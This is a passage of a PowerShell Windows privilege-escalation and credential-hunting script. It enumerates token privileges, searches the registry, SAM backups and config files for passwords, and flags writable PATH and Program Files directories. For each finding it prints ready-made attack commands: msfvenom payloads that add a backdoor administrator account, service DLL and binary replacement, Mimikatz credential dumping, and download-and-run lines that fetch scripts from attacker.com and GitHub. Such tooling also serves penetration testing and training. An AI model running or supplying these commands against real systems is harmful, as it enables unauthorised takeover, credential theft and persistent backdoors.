# Take ownership of a system file and replace it:
# Create a malicious DLL file
msfvenom -p windows/x64/exec CMD='cmd.exe /c net user administrator P@ssw0rd /add' -f dll > evil.dll

# Backup and replace a Windows service DLL (example with wlbsctrl.dll):
copy C:\Windows\System32\wlbsctrl.dll C:\Windows\System32\wlbsctrl.dll.bak
copy evil.dll C:\Windows\System32\wlbsctrl.dll

# Restart the service or system to trigger
"@
                    }
                    "SeDebugPrivilege" {
                        Show-PrivEscVector "SeDebugPrivilege Enabled" "Process Memory Access" @"
# Use Mimikatz to dump credentials:
# Download Mimikatz from https://github.com/gentilkiwi/mimikatz
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords

# Alternative PowerShell approach:
# Load PowerShell script
powershell -ep bypass
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords'
"@
                    }
                    "SeLoadDriverPrivilege" {
                        Show-PrivEscVector "SeLoadDriverPrivilege Enabled" "Vulnerable Driver Loading" @"
# Create a driver config in registry:
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\path\to\vulnerable_driver.sys"

# Load the driver:
$Code = @"
using System;
using System.Runtime.InteropServices;

public class Driver {
    [DllImport("Ntdll.dll")]
    public static extern uint NtLoadDriver(ref string DriverServiceName);
    
    public static void Load(string DriverName) {
        string DriverPath = @"\Registry\User\S-1-5-21-1111111111-2222222222-3333333333-1000\System\CurrentControlSet\" + DriverName;
        NtLoadDriver(ref DriverPath);
    }
}
"@

Add-Type $Code

# Load the vulnerable driver and exploit it
[Driver]::Load("CAPCOM")
"@
                    }
                }
            } else {
                Write-Host "  [DISABLED] $($privilege.Name)" -ForegroundColor Yellow
            }
        } catch {
            Write-Host "  [ERROR] Failed to check $($privilege.Name): $($_.Exception.Message)" -ForegroundColor Red
        }
    }
}

# ===============================================================
# Credential Hunting
# ===============================================================

function Find-Credentials {
    Show-Section "Credential Hunting"
    
    # Search for passwords in registry
    Show-Subsection "Searching for passwords in registry"
    
    $registryPaths = @(
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
        "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
        "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run",
        "HKLM:\SYSTEM\CurrentControlSet\Services",
        "HKCU:\Software\SimonTatham\PuTTY\Sessions",
        "HKCU:\Software\ORL\WinVNC3",
        "HKLM:\SOFTWARE\RealVNC\WinVNC4",
        "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon",
        "HKLM:\SYSTEM\CurrentControlSet\Services\SNMP"
    )
    
    foreach ($path in $registryPaths) {
        if (Test-Path $path) {
            Write-Host "Searching in: $path" -ForegroundColor Yellow
            
            try {
                Get-ChildItem -Path $path -Recurse -ErrorAction SilentlyContinue | 
                    Get-ItemProperty -ErrorAction SilentlyContinue | 
                    Select-Object -Property * -ErrorAction SilentlyContinue | 
                    Where-Object { $_ -match "password|pwd|pass|credential|cred" } | 
                    Format-List
            } catch {
                # Skip errors
            }
        }
    }
    
    # Check for AutoLogon credentials
    Show-Subsection "Checking for AutoLogon credentials"
    
    $autoLogonPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
    if (Test-Path $autoLogonPath) {
        $autoLogonValues = Get-ItemProperty -Path $autoLogonPath -ErrorAction SilentlyContinue
        
        if ($autoLogonValues.AutoAdminLogon -eq "1") {
            Write-Host "AutoLogon is enabled!" -ForegroundColor Red
            Write-Host "  DefaultUserName: $($autoLogonValues.DefaultUserName)" -ForegroundColor White
            Write-Host "  DefaultPassword: $($autoLogonValues.DefaultPassword)" -ForegroundColor White
            Write-Host "  DefaultDomainName: $($autoLogonValues.DefaultDomainName)" -ForegroundColor White
            
            Show-PrivEscVector "AutoLogon Credentials Found" "AutoLogon Credential Reuse" @"
# Use the discovered credentials to access additional resources:
runas /user:$($autoLogonValues.DefaultDomainName)\$($autoLogonValues.DefaultUserName) /savecred cmd.exe
"@
        }
    }
    
    # Search for passwords in common config files
    Show-Subsection "Searching for passwords in config files"
    
    $configFiles = @(
        "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt",
        "$env:SystemRoot\System32\inetsrv\config\applicationHost.config",
        "$env:SystemRoot\repair\SAM",
        "$env:SystemRoot\repair\system",
        "$env:SystemRoot\repair\software",
        "$env:SystemRoot\repair\security",
        "$env:SystemRoot\System32\config\RegBack\SAM",
        "$env:SystemRoot\System32\config\RegBack\system",
        "$env:SystemRoot\System32\config\RegBack\software",
        "$env:SystemRoot\System32\config\RegBack\security",
        "C:\inetpub\wwwroot\web.config",
        "C:\inetpub\wwwroot\appsettings.json",
        "$env:APPDATA\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    )
    
    foreach ($file in $configFiles) {
        if (Test-Path $file) {
            Write-Host "Found config file: $file" -ForegroundColor Yellow
            
            if ($file -like "*.xml" -or $file -like "*.config" -or $file -like "*.json" -or $file -like "*.txt") {
                $content = Get-Content $file -ErrorAction SilentlyContinue
                $matches = $content | Select-String -Pattern "password|pwd|pass|credential|cred" -SimpleMatch
                
                if ($matches) {
                    foreach ($match in $matches) {
                        Write-Host "  $match" -ForegroundColor Red
                    }
                    
                    Show-PrivEscVector "Credential found in file: $file" "Credential Reuse" @"
# Examine the file for more details:
notepad "$file"

# Use the discovered credentials to access resources
"@
                }
            }
        }
    }
    
    # Search for stored credentials
    Show-Subsection "Checking for stored credentials"
    
    Write-Host "Windows Credential Manager entries:" -ForegroundColor Yellow
    cmdkey /list
    
    Write-Host "`nRDP saved credentials:" -ForegroundColor Yellow
    $path = "$env:USERPROFILE\AppData\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings"
    if (Test-Path $path) {
        Write-Host "  Remote Desktop Connection Manager settings found!" -ForegroundColor Red
        $content = Get-Content $path -ErrorAction SilentlyContinue
        $matches = $content | Select-String -Pattern "<password>" -SimpleMatch
        
        if ($matches) {
            Write-Host "  Encrypted passwords found in RDCMan.settings" -ForegroundColor Red
            
            Show-PrivEscVector "RDCMan Stored Credentials" "Credential Extraction" @"
# Extract and decrypt passwords from RDCMan.settings:
# Use tools like RdpThief or SessionGopher to extract credentials
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1')
Invoke-SessionGopher -Thorough
"@
        }
    }
}

# ===============================================================
# File and Registry Permissions
# ===============================================================

function Check-WeakPermissions {
    Show-Section "File and Registry Permissions"

    # Check for writable paths in PATH environment variable
    Show-Subsection "Checking for writable directories in PATH"
    $pathDirs = $env:PATH -split ";" | Where-Object { $_ -ne "" }
    
    foreach ($dir in $pathDirs) {
        if (Test-Path $dir) {
            try {
                $acl = Get-Acl $dir -ErrorAction Stop
                $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
                $userHasModifyAccess = $false
                $everyoneHasModifyAccess = $false
                
                foreach ($accessRule in $acl.Access) {
                    $identity = $accessRule.IdentityReference.Value
                    
                    if (($identity -eq $currentUser -or $identity -like "*\$($env:USERNAME)") -and 
                        $accessRule.FileSystemRights -match "FullControl|Modify|Write") {
                        $userHasModifyAccess = $true
                    }
                    
                    if ($identity -eq "Everyone" -and 
                        $accessRule.FileSystemRights -match "FullControl|Modify|Write") {
                        $everyoneHasModifyAccess = $true
                    }
                }
                
                if ($userHasModifyAccess -or $everyoneHasModifyAccess) {
                    Write-Host "Writable directory in PATH: $dir" -ForegroundColor Red
                    if ($userHasModifyAccess) { Write-Host "  Current user has write access!" -ForegroundColor Red }
                    if ($everyoneHasModifyAccess) { Write-Host "  Everyone has write access!" -ForegroundColor Red }
                    
                    $exploitCommand = @"
# Create a malicious version of a commonly used command (e.g., net.exe):
msfvenom -p windows/exec CMD='cmd.exe /c net user evil P@ssw0rd /add && net localgroup administrators evil /add' -f exe > $dir\net.exe

# Wait for someone to use the command, or use it yourself if it's a typical tool
"@
                    Show-PrivEscVector "Writable PATH Directory: $dir" "DLL/Binary Hijacking" $exploitCommand
                }
            } catch {
                # Skip errors
            }
        }
    }
    
    # Check for weak folder permissions in Program Files
    Show-Subsection "Checking for weak permissions in Program Files"
    $programDirs = @("C:\Program Files", "C:\Program Files (x86)")
    
    foreach ($progDir in $programDirs) {
        if (Test-Path $progDir) {
            $appDirs = Get-ChildItem $progDir -Directory -ErrorAction SilentlyContinue
            
            foreach ($appDir in $appDirs) {
                try {
                    $acl = Get-Acl $appDir.FullName -ErrorAction Stop
                    $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
                    $userHasModifyAccess = $false
                    $everyoneHasModifyAccess = $false
                    
                    foreach ($accessRule in $acl.Access) {
                        $identity = $accessRule.IdentityReference.Value
                        
                        if (($identity -eq $currentUser -or $identity -like "*\$($env:USERNAME)") -and 
                            $accessRule.FileSystemRights -match "FullControl|Modify|Write") {
                            $userHasModifyAccess = $true
                        }
                        
                        if ($identity -eq "Everyone" -and 
                            $accessRule.FileSystemRights -match "FullControl|Modify|Write") {
                            $everyoneHasModifyAccess = $true
                        }
                    }
                    
                    if ($userHasModifyAccess -or $everyoneHasModifyAccess) {
                        Write-Host "Writable application directory: $($appDir.FullName)" -ForegroundColor Red
                        if ($userHasModifyAccess) { Write-Host "  Current user has write access!" -ForegroundColor Red }
                        if ($everyoneHasModifyAccess) { Write-Host "  Everyone has write access!" -ForegroundColor Red }
                        
                        # Look for service executables in this directory
                        $serviceBinaries = Get-WmiObject -Class Win32_Service | 
                                             Where-Object { $_.PathName -like "*$($appDir.Name)*" } | 
                                             Select-Object Name, PathName
                        
                        if ($serviceBinaries) {
                            foreach ($serviceBinary in $serviceBinaries) {
                                $exploitCommand = @"
# Create a malicious executable:
msfvenom -p windows/exec CMD='net user evil P@ssw0rd /add && net localgroup administrators evil /add' -f exe > evil.exe

# Replace the original service executable:
copy "$($serviceBinary.PathName)" "$($serviceBinary.PathName).bak"
copy evil.exe "$($serviceBinary.PathName)"

# Wait for service restart or system reboot
"@
                                Show-PrivEscVector "Writable Service in Application Directory: $($serviceBinary.Name)" "Service Binary Replacement" $exploitCommand
                            }
                        } else {
                            $exploitCommand = @"
# Check for auto-run executables or possible DLL hijacking:
dir "$($appDir.FullName)" /s /b | findstr .exe
dir "$($appDir.FullName)" /s /b | findstr .dll

# Create a malicious DLL for hijacking:
msfvenom -p windows/exec CMD='net user evil P@ssw0rd /add && net localgroup administrators evil /add' -f dll > "$($appDir.FullName)\missing.dll"

# Or replace an executable:
msfvenom -p windows/exec CMD='net user evil P@ssw0rd /add && net localgroup administrators evil /add' -f exe > "$($appDir.FullName)\target.exe"
"@
                            Show-PrivEscVector "Writable Application Directory: $($appDir.Name)" "DLL Hijacking/Binary Replacement" $exploitCommand
                        }